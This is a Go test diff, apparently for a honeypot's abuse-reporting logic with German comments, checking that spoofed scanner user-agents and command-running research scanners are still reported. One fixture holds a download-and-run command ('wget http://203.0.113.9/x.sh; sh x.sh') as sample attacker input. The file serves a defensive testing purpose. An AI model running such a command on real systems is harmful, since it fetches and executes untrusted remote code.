@@ -44,6 +44,30 @@ func TestAbuseVerdict(t *testing.T) {
 	if _, why := abuseVerdict(scan, cfg); !strings.Contains(why, "Censys") {
 		t.Fatalf("Forschungsscanner: %q", why)
 	}
+	// M3 (Audit 3): Ein User-Agent macht niemanden zum Forschungsscanner …
+	ua := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/", "method": "GET", "user_agent": "Mozilla/5.0 (compatible; Shodan; +https://www.shodan.io)"})
+	ua.SrcIP = "203.0.113.53"
+	fake := attackOf(append([]*Event{ua}, sshBrute("203.0.113.53")...)...)
+	if fake.Scanner != "" {
+		t.Fatalf("Scanner per User-Agent: %q", fake.Scanner)
+	}
+	if _, why := abuseVerdict(fake, cfg); why != "" {
+		t.Fatalf("mit Scanner-User-Agent nicht gemeldet: %q", why)
+	}
+	// … und ein echter Vermesser, der Befehle ausführt, verliert die Ausnahme.
+	cmd := svcCmd("telnet", "uname -a; wget http://203.0.113.9/x.sh; sh x.sh")
+	cmd.SrcIP = "203.0.113.52"
+	inv := attackOf(append(sshBrute("203.0.113.52"), cmd)...)
+	inv.ASOrg = "Censys, Inc."
+	inv.Scanner = ""
+	inv.Services, inv.Ports, inv.Mitre = nil, nil, nil
+	inv.finish()
+	if inv.Scanner != "" || inv.Stufe < stufeBefehle {
+		t.Fatalf("Ausnahme trotz Befehlen: %q Stufe %d", inv.Scanner, inv.Stufe)
+	}
+	if _, why := abuseVerdict(inv, cfg); strings.Contains(why, "Forschungsscanner") {
+		t.Fatalf("Vermesser mit Befehlen ausgelassen: %q", why)
+	}
 	if _, why := abuseVerdict(attackOf(svcCmd("redis", "PING"), svcCmd("redis", "INFO")), cfg); why == "" {
 		t.Fatal("Redis-Abfrage gemeldet")
 	}
